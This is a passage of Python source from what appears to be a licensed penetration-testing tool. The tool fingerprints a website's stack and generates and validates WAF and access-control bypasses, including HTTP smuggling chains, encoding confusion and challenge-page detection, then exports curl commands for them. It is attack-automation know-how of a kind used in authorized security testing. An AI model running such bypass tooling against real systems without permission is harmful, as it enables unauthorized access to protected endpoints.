            other_bypass = [b for b in self.bypasses if b not in smuggling_bypasses][0]
            chains.append({
                'name': 'HTTP Smuggling with Secondary Bypass',
                'severity': 'CRITICAL',
                'steps': [
                    smuggling_bypasses[0],
                    other_bypass
                ],
                'description': 'Use HTTP smuggling to bypass WAF, then exploit secondary vulnerability',
                'cvss_score': 9.8
            })

        # Chain 3: Multiple encoding confusions
        encoding_bypasses = [b for b in self.bypasses if 'Encoding' in b.get('type', '') or 'Unicode' in b.get('type', '')]
        if len(encoding_bypasses) >= 2:
            chains.append({
                'name': 'Layered Encoding Confusion',
                'severity': 'HIGH',
                'steps': encoding_bypasses[:2],
                'description': 'Stack multiple encoding techniques to bypass normalization',
                'cvss_score': 8.0
            })

        return chains


_SOFT_BLOCK_PATTERNS = [
    'just a moment',
    'please verify you are human',
    'checking your browser',
    'ddos protection by',
    'enable javascript and cookies',
    'ray id',
    'cf-mitigated',
    'captcha',
    'are you a robot',
    'access denied',
    'security check',
    'attention required',
    'please wait',
    'bot protection',
]


class BypassValidator:
    """
    Validates generated bypasses to confirm they work.
    """

    def __init__(self, bypasses: List[Dict], session: requests.Session):
        self.bypasses = bypasses
        self.session = session
        self.validated = []
        # Iniettati opzionalmente dal chiamante per logging nel DB
        self.learning_db = None
        self.scan_id = None
    
    def validate_all(self):
        """Validate all generated bypasses"""
        print("\n🧪 Phase 5: Bypass Validation")
        print("=" * 70)
        
        if not self.bypasses:
            print("  ⚠️ No bypasses to validate")
            return []
        
        print(f"  🔬 Validating {len(self.bypasses)} bypass techniques...")
        
        for bypass in self.bypasses:
            if self._validate_bypass(bypass):
                self.validated.append(bypass)
                print(f"    ✅ Validated: {bypass['type']} - {bypass['description']}")
            else:
                print(f"    ❌ Failed: {bypass['type']}")
        
        print(f"\n  📊 Validation complete: {len(self.validated)}/{len(self.bypasses)} bypasses confirmed")
        return self.validated
    
    @staticmethod
    def _is_soft_blocked(response) -> bool:
        """
        Rileva soft-block WAF: risposta 200 con body challenge (Cloudflare JS,
        CAPTCHA, redirect /cdn-cgi/challenge, ecc.).
        Questi falsi 2xx vanno filtrati prima della conferma bypass.
        """
        # Controlla header Location per redirect challenge (allow_redirects=False)
        location = response.headers.get('Location', '')
        if '/cdn-cgi/challenge' in location or '/cdn-cgi/l/chk_jschl' in location:
            return True
        # Controlla header Cloudflare mitigation
        if response.headers.get('cf-mitigated', '').lower() == 'challenge':
            return True
        # Controlla body per pattern challenge
        try:
            body_lower = response.text[:4000].lower()
        except Exception:
            return False
        return any(pattern in body_lower for pattern in _SOFT_BLOCK_PATTERNS)

    def _validate_bypass(self, bypass: Dict) -> bool:
        """Validate a single bypass con N=3 run e soft-block detection.

        Un bypass è confermato solo se ≥ 2 run su 3 restituiscono 2xx
        E non presentano soft-block (challenge WAF mimetizzato come 200).
        Delay randomizzato tra run per ridurre hit su cache deterministico.
        """
        _2XX = {200, 201, 202, 203, 204, 205, 206}
        n_runs = 3
        run_results = []
        confirmed_runs = 0

        for run_idx in range(1, n_runs + 1):
            # Delay randomizzato inter-run (primo run senza delay)
            if run_idx > 1:
                time.sleep(random.uniform(0.5, 2.0))
            try:
                response = self.session.request(
                    method=bypass['method'],
                    url=bypass['url'],
                    headers=bypass.get('headers', {}),
                    timeout=10,
                    allow_redirects=False
                )
                sc = response.status_code
                soft_blocked = self._is_soft_blocked(response)
                run_ok = sc in _2XX and not soft_blocked

                # Log soft-block nel DB se rilevato
                if soft_blocked and self.learning_db and self.scan_id:
                    self.learning_db.record_evidence_weight(
                        scan_id=self.scan_id,
                        evidence_type='soft_block.detected',
                        tool='traceroute',
                        lr=0.0,
                        true_positive=False
                    )

                run_results.append({
                    'run': run_idx,
                    'status': sc,
                    'soft_blocked': soft_blocked,
                    'confirmed': run_ok
                })
                if run_ok:
                    confirmed_runs += 1

            except Exception as e:
                run_results.append({
                    'run': run_idx,
                    'status': 0,
                    'soft_blocked': False,
                    'confirmed': False,
                    'error': str(e)
                })

        success_rate = confirmed_runs / n_runs

        if confirmed_runs >= 2:
            bypass['validation'] = {
                'status': 'CONFIRMED',
                'response_code': next(
                    (r['status'] for r in run_results if r.get('confirmed')), 200
                ),
                'run_results': run_results,
                'success_rate': success_rate,
                'validated_at': datetime.now().isoformat()
            }
            return True

        # Almeno un run con status insolito (non blocco standard) → DISCREPANCY
        unusual = any(
            r['status'] not in {0, 400, 401, 403, 421, 429, 503}
            and r['status'] != 0
            for r in run_results
        )
        if unusual:
            best_code = next(
                (r['status'] for r in run_results
                 if r['status'] not in {0, 400, 401, 403, 421, 429, 503}),
                run_results[0]['status']
            )
            bypass['validation'] = {
                'status': 'DISCREPANCY',
                'response_code': best_code,
                'run_results': run_results,
                'success_rate': success_rate,
                'validated_at': datetime.now().isoformat(),
                'note': f'Response differs but not confirmed bypass (success_rate={success_rate:.0%})'
            }

        return False


class ReportGenerator:
    """
    Generates comprehensive reports and exports.
    """
    
    def __init__(self, target_url: str, stack_analyzer: ProgressiveStackAnalyzer, 
                 discrepancies: List[Dict], bypasses: List[Dict]):
        self.target_url = target_url
        self.stack_analyzer = stack_analyzer
        self.discrepancies = discrepancies
        self.bypasses = bypasses
    
    def generate_text_report(self) -> str:
        """Generate human-readable text report"""
        report = f"""
{'=' * 80}
APPLICATION STACK TRACEROUTE v4.1.0 - INTELLIGENT RECONSTRUCTION
{'=' * 80}

🎯 TARGET: {self.target_url}
📅 SCAN TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

{'=' * 80}
📊 DISCOVERED STACK ARCHITECTURE
{'=' * 80}

"""
        
        # Stack layers
        if self.stack_analyzer.stack['layers']:
            report += "🔗 Processing Chain:\n\n"
            for idx, layer in enumerate(self.stack_analyzer.stack['layers'], 1):
                report += f"  {idx}. {layer['type']}: {layer['component']}\n"
                report += f"     Confidence: {layer['confidence']}/100 ({layer['level']})\n"
                report += f"     Evidence: {', '.join(layer['evidence'])}\n\n"
        else:
            report += "  ⚠️ No stack components detected\n\n"
        
        # Discrepancies
        report += f"\n{'=' * 80}\n"
        report += f"🧪 PARSER DISCREPANCIES FOUND: {len(self.discrepancies)}\n"
        report += f"{'=' * 80}\n\n"
        
        if self.discrepancies:
            for idx, disc in enumerate(self.discrepancies, 1):
                report += f"  {idx}. {disc['type']} - {disc.get('test_name', disc.get('method', 'N/A'))}\n"
                severity = disc.get('severity', 'MEDIUM')
                cvss = disc.get('cvss_score', 'N/A')
                report += f"     Severity: {severity} (CVSS: {cvss})\n"
                report += f"     Response: {disc.get('response_code', 'N/A')}\n\n"
        else:
            report += "  ✅ No discrepancies found - stack is consistent\n\n"

        # Bypasses
        report += f"\n{'=' * 80}\n"
        report += f"🛠️ GENERATED BYPASSES: {len(self.bypasses)}\n"
        report += f"{'=' * 80}\n\n"

        if self.bypasses:
            for idx, bypass in enumerate(self.bypasses, 1):
                report += f"  {idx}. {bypass['type']}\n"
                report += f"     ID: {bypass['id']}\n"
                severity = bypass.get('severity', 'MEDIUM')
                report += f"     Severity: {severity}\n"
                report += f"     Description: {bypass['description']}\n"
                report += f"     Command: {bypass['curl_command']}\n"

                ct = bypass.get('causal_trace')
                if ct:
                    report += f"     Layer aggirato: {ct.get('layer_bypassed', 'N/A')}\n"
                    if ct.get('primary_evidence'):
                        report += f"     Evidenza: {ct['primary_evidence']}\n"
                    if ct.get('bayesian_probability') is not None:
                        report += f"     Probabilità bayesiana: {ct['bayesian_probability']:.1%}\n"

                if 'validation' in bypass:
                    status = bypass['validation']['status']
                    report += f"     Validation: {status}\n"

                report += "\n"
        else:
            report += "  ⚠️ No bypasses generated\n\n"
        
        report += f"\n{'=' * 80}\n"
        report += "📝 NOTES:\n"
        report += f"{'=' * 80}\n\n"
        report += "This report contains validated bypass techniques for authorized security testing.\n"
        report += "Use responsibly and only on targets you have permission to test.\n"
        report += "Export JSON for automation with Exploit Orchestrator tools.\n\n"
        
        return report
    
    def export_json(self, filename: Optional[str] = None) -> str:
        """
        Export data to JSON for orchestration tools.
        FORMAT COMPATIBLE with v2.8 - Works with Burp Suite and smart_crawler

        Saves to organized directory structure:
        results/{domain}_{timestamp}/bypasses_{domain}_{timestamp}.json
        """
        # Reuse the directory created at init time (shared with debug log).
        # Fall back to creating a new one only if called standalone.
        domain = urlparse(self.target_url).netloc.replace(':', '_').replace('.', '_')
        if hasattr(self, 'results_dir') and os.path.isdir(self.results_dir):
            output_dir = self.results_dir
            timestamp = self._scan_ts
        else:
            timestamp = int(time.time())
            ensure_results_base()
            output_dir = os.path.join(RESULTS_BASE_STR, f"{domain}_{timestamp}")
            os.makedirs(output_dir, exist_ok=True)

        # Generate filename if not provided
        if not filename:
            filename = f"bypasses_{domain}_{timestamp}.json"

        # Full path to output file
        output_path = os.path.join(output_dir, filename)

        # Extract layer names for infrastructure_chain (v2.8 format)
        infrastructure_chain = []
        for layer in self.stack_analyzer.stack['layers']:
            infrastructure_chain.append(f"{layer['type']}-{layer['component']}")

        # Prepare bypass data (v2.8 format with curl commands)
        export_data = {
            'target_url': self.target_url,
            'scan_timestamp': datetime.now().isoformat(),
            'infrastructure_chain': infrastructure_chain,
            'total_discrepancies': len(self.discrepancies),
            'total_bypasses': len(self.bypasses),
            'bypasses': []
        }

        for idx, bypass in enumerate(self.bypasses, 1):
            bypass_entry = {
                'id': f"bypass_{idx}",
                'type': bypass.get('type', 'Unknown'),
                'target': bypass.get('url', self.target_url),
                'description': bypass.get('description', ''),
                'validated': bypass.get('validation', {}).get('status') == 'CONFIRMED',
                'curl_data': bypass.get('curl_data', {}),
                'payload': str(bypass.get('payload', ''))
            }

            # Generate curl command (v2.8 style)
            curl_command = self._generate_curl_command(bypass_entry)
            bypass_entry['curl_command'] = curl_command

            export_data['bypasses'].append(bypass_entry)

        # Save to JSON file in organized directory
        with open(output_path, 'w') as f:
            json.dump(export_data, f, indent=2, default=str)

        print(f"\n💾 JSON Export (v2.8 compatible): {output_path}")
        print(f"   📁 Output directory: {output_dir}/")
        print(f"   Total bypasses: {len(export_data['bypasses'])}")
        print(f"   Validated: {len([b for b in export_data['bypasses'] if b['validated']])}")

        return output_path

    def _generate_curl_command(self, bypass_entry: Dict) -> str:
        """Generate curl command for a specific bypass (v2.8 format)"""
        base_url = self.target_url
        curl_data = bypass_entry.get('curl_data', {})

        if not curl_data:
            # Fallback: simple command based on bypass type
            return f"curl -i '{bypass_entry.get('target', base_url)}'"

        method = curl_data.get('method', 'GET')

        # Build curl command
        cmd_parts = ['curl', '-i']

        # Add method
        if method != 'GET':
            cmd_parts.append(f'-X {method}')

        # Add headers
        headers = curl_data.get('headers', {})
        for header, value in headers.items():
            if not header.startswith(':'):  # Skip HTTP/2 pseudo-headers
                cmd_parts.append(f'-H "{header}: {value}"')

        # Add data
        if 'data' in curl_data:
            if isinstance(curl_data['data'], str):
                cmd_parts.append(f'-d "{curl_data["data"]}"')
            elif isinstance(curl_data['data'], dict):
                cmd_parts.append(f"-d '{json.dumps(curl_data['data'])}'")

        # Add path/query
        path = curl_data.get('path', '')
        query = curl_data.get('query', '')
        full_url = f"{base_url}{path}{query}"

        cmd_parts.append(f'"{full_url}"')

        # Add notes
        if 'note' in curl_data:
            return f"# Note: {curl_data['note']}\n{' '.join(cmd_parts)}"

        return ' '.join(cmd_parts)


class ApplicationTraceroute:
    """
    Main orchestrator for the complete analysis workflow.
    """
    
    def __init__(self, target_url: str, forbidden_endpoint: Optional[str] = None,
                 skip_forbidden_tests: bool = False, debug_mode: bool = False):
        self.target_url = target_url.rstrip('/')
        self.forbidden_endpoint = forbidden_endpoint
        self.skip_forbidden_tests = skip_forbidden_tests

        # Create a single results directory shared by JSON export and debug log.
        # Use the same domain slug and timestamp as export_json() so everything
        # lands in one folder regardless of when each piece is written.
        ensure_results_base()
        domain = urlparse(self.target_url).netloc.replace(':', '_').replace('.', '_')
        self._scan_ts = int(time.time())
        self.results_dir = os.path.join(RESULTS_BASE_STR, f"{domain}_{self._scan_ts}")
        os.makedirs(self.results_dir, exist_ok=True)

        # Initialize base session
        base_session = requests.Session()
        base_session.verify = False

        # Wrap with DebugSession when --debug is requested
        self.debug_logger = None
        if debug_mode:
            if DEBUG_LOGGER_AVAILABLE:
                self.debug_logger = DebugLogger(output_dir=self.results_dir, enabled=True)
                self.session = DebugSession(base_session, self.debug_logger)
                print(f"  🐛 Debug mode enabled — logging to: {self.debug_logger.output_file}")
            else:
                print("  ⚠  Debug mode requested but debug_logger module not available")
                self.session = base_session
        else:
            self.session = base_session

        # Components
        self.stack_analyzer = ProgressiveStackAnalyzer(target_url)
        self.stack_analyzer.session = self.session  # Share session

        self.forbidden_finder = ForbiddenEndpointFinder(target_url, self.session)
        self.discrepancy_tester = None
        self.bypass_generator = None
        self.bypass_validator = None
        self.report_generator = None

        # SQLite Learning System
        self.learning_db = LearningDB() if LEARNING_DB_AVAILABLE else None
        self.scan_id = None
    
    async def run_full_analysis(self):
        """Run complete analysis workflow"""
        print("\n" + "=" * 80)
        print("🔬 APPLICATION STACK TRACEROUTE v4.1.0")
        print("🎯 Intelligent Stack Reconstruction & Bypass Generation")
        print("=" * 80)
        print(f"\n🎯 Target: {self.target_url}\n")

        # Registra scan all'inizio — scan_id usato da tutti i record_* durante lo scan
        if self.learning_db:
            self.scan_id = self.learning_db.record_scan(
                tool='traceroute',
                target=self.target_url,
            )

        # Phase 0: Find Forbidden Endpoint
        if not self.skip_forbidden_tests:
            self.forbidden_endpoint = self.forbidden_finder.find(self.forbidden_endpoint)
        
        # Phase 1: Send Baseline Request
        print("\n🔍 Phase 1: Baseline Analysis")
        print("=" * 70)
        baseline_response = self.stack_analyzer.send_baseline_request()
        print(f"  ✅ Baseline request completed (Status: {baseline_response.status_code})")
        
        # Phase 2: Progressive Stack Fingerprinting
        print("\n🔍 Phase 2: Progressive Stack Fingerprinting")
        print("=" * 70)
        
        # 2a: Header Timeline Analysis
        timeline = self.stack_analyzer.analyze_header_timeline(baseline_response)
        print(f"  ✅ Header timeline analyzed: {len(timeline)} processing hops detected")
        
        # 2b: Deep Fingerprinting
        self.stack_analyzer.progressive_fingerprinting(baseline_response)
        
        # 2c: Correlate Stack
        self.stack_analyzer.correlate_stack()
        
        # Phase 3: Discrepancy Testing
        if self.forbidden_endpoint and not self.skip_forbidden_tests:
            self.discrepancy_tester = DiscrepancyTester(
                self.target_url,
                self.forbidden_endpoint,
                self.session,
                self.stack_analyzer
            )
            # Inietta LearningDB in DiscrepancyTester e tutti i componenti avanzati
            if self.learning_db and self.scan_id:
                self.discrepancy_tester.inject_learning_db(
                    self.learning_db, self.scan_id
                )
                # TASK 3.2 — inietta learning_db anche in stack_analyzer per z-score timing
                self.stack_analyzer.learning_db = self.learning_db
                self.stack_analyzer.scan_id = self.scan_id
                self.stack_analyzer.target_url = self.target_url
            discrepancies = self.discrepancy_tester.test_all_discrepancies()
        else:
            print("\n⚠️ Phase 3: Skipping discrepancy testing (no forbidden endpoint)")
            discrepancies = []
        
        # Phase 4: Bypass Generation
        self.bypass_generator = BypassGenerator(
            discrepancies,
            self.stack_analyzer.stack
        )
        bypasses = self.bypass_generator.generate_all_bypasses()
        
        # Phase 5: Bypass Validation
        self.bypass_validator = BypassValidator(bypasses, self.session)
        validated_bypasses = self.bypass_validator.validate_all()
        
        # Phase 6: Report Generation
        self.report_generator = ReportGenerator(
            self.target_url,
            self.stack_analyzer,
            discrepancies,
            validated_bypasses
        )
        
        # Generate text report
        text_report = self.report_generator.generate_text_report()
        
        # Export JSON (returns full path)
        json_file = self.report_generator.export_json()

        # Save text report in the same directory as JSON
        output_dir = os.path.dirname(json_file)
        domain = urlparse(self.target_url).netloc.replace(':', '_').replace('.', '_')
        timestamp = int(time.time())
        report_filename = f"traceroute_{domain}_{timestamp}.txt"
        report_path = os.path.join(output_dir, report_filename)

        with open(report_path, 'w') as f:
            f.write(text_report)

        print(f"\n📄 Text Report: {report_path}")
        
        # Print summary
        print("\n" + "=" * 80)
        print("📊 ANALYSIS COMPLETE")
        print("=" * 80)
        print(f"  Stack Layers: {len(self.stack_analyzer.stack['layers'])}")
        print(f"  Discrepancies: {len(discrepancies)}")
        print(f"  Bypasses Generated: {len(bypasses)}")
        print(f"  Bypasses Validated: {len(validated_bypasses)}")
        print("\n" + "=" * 80)

        # Aggiorna record con dati finali e avvia update_priors in background
        if self.learning_db and self.scan_id:
            stack_sig = _build_stack_signature(self.stack_analyzer.stack.get('layers', []))
            self.learning_db._update_scan_outcome(
                scan_id=self.scan_id,
                stack_signature=stack_sig,
                outcome_summary={'bypasses_found': len(validated_bypasses)}
            )
            t = threading.Thread(
                target=self.learning_db.update_priors,
                args=('traceroute', _hash_target(self.target_url)),
                daemon=True
            )
            t.start()

        return text_report


def main():
    import argparse
    from core.license_manager import require_license, activate_license, deactivate_license, check_license

    parser = argparse.ArgumentParser(
        description='Application Stack Traceroute v4.1.0 - Intelligent Stack Reconstruction',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  security-traceroute https://target.com
  security-traceroute https://target.com --forbidden-endpoint https://target.com/admin
  security-traceroute https://target.com --skip-forbidden-tests

License management (shared with security-crawler):
  security-traceroute --license-status
      Show current license type, key, expiration date and days remaining.

  security-traceroute --activate-license YOUR_LICENSE_KEY
      Activate or renew a license key. If a license is already active its
      online activation slot is released before the new one is registered.
      License types accepted:
        Monthly     : AT_XXX_XXX_XXX_XXXmo  (30 days)
        Annual      : AT_XXX_XXX_XXX_XXXyr  (365 days)

  security-traceroute --deactivate-license
      Deactivate the current license online and remove the local license file.
      Use this before moving the tool to a different machine.

Note: the license is stored in ~/.application_traceroute/license.json and is
shared between security-traceroute and security-crawler. Activating from
either tool is sufficient.
        """
    )

    parser.add_argument('--version', action='version', version='security-traceroute 4.1.0')
    parser.add_argument('target', nargs='?', help='Target URL to analyze')
    parser.add_argument(
        '--forbidden-endpoint',
        help='Known 403/401 endpoint for bypass testing (e.g. https://target.com/admin)'
    )
    parser.add_argument(
        '--skip-forbidden-tests',
        action='store_true',
        help='Skip tests requiring forbidden endpoint'
    )
    parser.add_argument(
        '--activate-license',
        metavar='KEY',
        help='Activate (or renew) a license key and exit'
    )
    parser.add_argument(
        '--deactivate-license',
        action='store_true',
        help='Deactivate the current license and exit'
    )
    parser.add_argument(
        '--license-status',
        action='store_true',
        help='Show current license status and exit'
    )
    parser.add_argument(
        '--debug',
        action='store_true',
        help='Enable debug mode: log every HTTP request/response to a JSON file in the results directory'
    )

    args = parser.parse_args()

    # Handle license status
    if args.license_status:
        info = check_license()
        if info is None:
            print("No valid license found.")
        else:
            type_label = {"free": "FREE TRIAL", "monthly": "MONTHLY", "annual": "ANNUAL"}.get(
                info.license_type, info.license_type.upper())
            if info.license_type == "free":
                online = "[local]"
            elif info.activation_token:
                online = "[online]"
            else:
                online = "[offline]"
            print(f"License: {type_label} {online}")
            print(f"  Key:      {info.key}")
            print(f"  Expires:  {info.expiration_date.strftime('%Y-%m-%d')}")
            print(f"  Remaining: {info.days_remaining} days")
        return

    # Handle license deactivation
    if args.deactivate_license:
        ok = deactivate_license()
        if ok:
            print("License deactivated successfully.")
        else:
            print("No active license to deactivate.")
        return

    # Handle license activation / renewal
    if args.activate_license:
        info = activate_license(args.activate_license)
        if info.valid:
            print(f"License activated: {info.license_type} "
                  f"(expires {info.expiration_date.strftime('%Y-%m-%d')})")
        else:
            print(f"Invalid license key: {info.error}")
            raise SystemExit(1)
        return

    # Require target for normal operation
    if not args.target:
        parser.error("the following arguments are required: target")

    # License check
    require_license()

    # Run analysis
    tracer = ApplicationTraceroute(
        args.target,
        forbidden_endpoint=args.forbidden_endpoint,
        skip_forbidden_tests=args.skip_forbidden_tests,
        debug_mode=args.debug
    )

    # Use asyncio for async operations
    asyncio.run(tracer.run_full_analysis())

    # Flush debug log if enabled
    if args.debug and tracer.debug_logger:
        debug_file = tracer.debug_logger.save()
        if debug_file:
            print(f"\n🐛 DEBUG LOG saved to: {debug_file}")
            print("   Contains: all HTTP I/O, headers, request/response bodies")
            print("   Attach this file when reporting bugs")


if __name__ == "__main__":
    main()
